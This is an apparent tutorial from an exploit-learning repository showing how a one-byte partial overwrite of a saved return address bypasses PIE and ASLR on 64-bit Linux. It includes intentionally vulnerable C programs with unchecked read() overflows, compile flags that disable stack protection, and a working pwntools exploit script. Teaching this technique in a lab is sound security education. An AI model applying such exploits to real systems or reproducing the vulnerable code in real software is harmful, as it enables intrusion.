# Exploits
## Partial address overwrite with PIE
## Bypasses protections : ASLR, PIE (PIE can't be used without ASLR)
Now let's have a look at a technique which can bypass Position Independant Executable on a Little Endian system (most of systems work this way don't worry)  
If you don't know how PIE work i've explained it on this article talking about fork exploitation : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explt/Stack-buffer-overflow/Exploit-fork.md  
To demonstrate how it works, here is a simple program compiled with ASLR and PIE :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win(void)
{
	printf("You won !\n");
}
void nope()
{
	printf("Oops...\n");
}
void vuln()
{
	void (*func_pointer)(void) = nope;
	char buffer[64];
	printf("win address : %p\n", win);
	printf("function pointer before : %p\n", func_pointer);
	read(STDIN_FILENO, buffer, 256);
	printf("function pointer after : %p\n", func_pointer);
	func_pointer();
}
int main()
{
	vuln();
}
It's on 64 bits
```
To compile :
```
gcc <source code file>.c -o <executable> -fno-stack-protector -pie -fPIE -m64
```
Make sure to enable full ASLR :
```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
So the goal is to jump to `win` whose address is randomized with PIE  
You can see that there's a function pointer to overwrite (we will rather overwrite the return pointer later but now i used a function pointer just to get how it works)  
I've also printed the addresses for now just to see how `PIE` behaves exactly  
So let's run the program :
```
win address : 0x55c24355b189
function pointer before : 0x55c24355b1a0
(input)
function pointer after : 0x55c24355b1a0
Oops...
```
We can see that it prints the `win` function address and the function pointer before and after the input which, is vulnerable to a buffer overflow, you can also see that i used `read`, i will explain why later  
So here the function pointer was pointing at `nope` so it printed this lose message  
Let's first look at the address of `win` and of the `func_pointer` :
```
Function pointer : 0x55c24355b1a0
Win address      : 0x55c24355b189
```
Did you see that ? They're almost the same ! Actually, only **ONE** byte differs, in other words, if we overwrite only the last byte of the address with the last byte of `win` then we win !  
And we look at the `win` offset, it corresponds (we can use gdb to get it) :
```
gdb <executable>
x win
```
It gives me : 
```
0x1189
```
It's real address :
```
0x55c24355b189
```
Well it not corresponds byte per byte but remember that there is the program base, but only one byte is required to be changed
So let's change the source code to remove leaks :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win(void)
{
	printf("You won !\n");
}
void nope()
{
	printf("Oops...\n");
}
void vuln()
{
	void (*func_pointer)(void) = nope;
	char buffer[64];
	read(STDIN_FILENO, buffer, 256);
	func_pointer();
}
int main()
{
	vuln();
}
```
We can recompile by the same way as brefore, and it's the same but without any leak  
So the exploit is very simple, we just have to overwrite the last byte of the address, and because of the endianness of the system, it's the first byte we're overwriting which is the last byte of the address, by the way that's why we have to reverse the address when we completely overwrite it  
By the way i used `read` because, in opposition to `gets`, `fgets`... It doesn't add any null byte at the end of the input  
So let's change the code adding no function pointer but just with the reutrn pointer (RIP backup) overwrite :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win(void)
{
	printf("You won !\n");
}
void vuln()
{
	char buffer[64];
	read(STDIN_FILENO, buffer, 512);
}
int main()
{
	vuln();
}
```
So the first thing we want is the offset of win, we can get it with gdb :
```
gdb <executable>
(gdb)> x win
```
It gave me : `0x1189`  
So this is the exploit i used :
```python
from pwn import *

p = process("./vuln")

WIN_ADDR_OFF = 0x1189
USELESS_ADDR_OFF = 0x11a0

message = ""

payload = "A"*(64+8)
payload += "\x89" # last byte of win | Last byte of the address
time.sleep(1)
p.send(payload) # don't use p.sendline()
message = p.recv()
print(message)
```
Please do not use `p.sendline()` or `read` will add an `End Of Line` charater `\n` at the end of the input and it won't work  
So we run it :
```
python2 exploit.py
```
And...
```
Try to jump to win : You won !
```
Awsome ! It worked !  
Thanks for reading
